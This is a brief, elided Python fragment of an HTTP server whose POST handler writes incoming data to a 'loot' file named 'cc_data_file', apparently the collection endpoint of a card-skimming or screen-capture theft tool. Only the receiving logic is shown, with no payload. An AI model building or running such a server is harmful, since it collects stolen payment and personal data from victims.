...
class GetHandler(BaseHTTPRequestHandler):
    ...
    def do_POST(self):
        ...
        if self.path == "/post_data.php?protocol=http":
            ...
            with open(loot_path + screenshot_name, 'a') as cc_data_file:
                #cc_data_file.write('METADATA: From: ' + str(self.client_address) + ' ' + str(self.address_string) + '\n\n')
                cc_data_file.write(screen_data.decode('utf-8'))

        elif self.path == "/post_data.php?protocol=https":
